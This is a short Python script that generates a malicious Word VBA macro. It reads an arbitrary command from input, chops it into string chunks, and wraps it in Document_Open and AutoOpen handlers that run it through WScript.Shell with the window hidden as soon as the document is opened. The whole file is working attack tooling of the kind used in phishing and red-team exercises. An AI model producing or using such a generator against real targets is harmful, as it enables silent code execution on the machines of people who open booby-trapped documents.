#!/usr/bin/env python3

import fileinput

if __name__ == "__main__":
    payload = ''.join(fileinput.input()).strip()
    payload = payload.encode("unicode_escape").decode().replace('"', '\\"')
    length = 50

    print()
    print("Sub Document_Open()")
    print("    PWN")
    print("End Sub")
    print("")
    print("Sub AutoOpen()")
    print("    PWN")
    print("End Sub")
    print("")
    print("Sub PWN()")
    print("    Const DontWaitUntilFinished = False,  WaitUntilFinished = True")
    print("    Const ShowWindow = 1, DontShowWindow = 0")
    print("    Dim cmd as String")
    for i in range(0, len(payload), length):
        chunk = payload[i:i+length]
        print(f'    cmd = cmd + "{chunk}"')
    print('    set sh = CreateObject("WScript.Shell")')
    print('    sh.Run cmd, DontShowWindow') # can add ', WaitUntilFinished' at end
    print("End Sub")
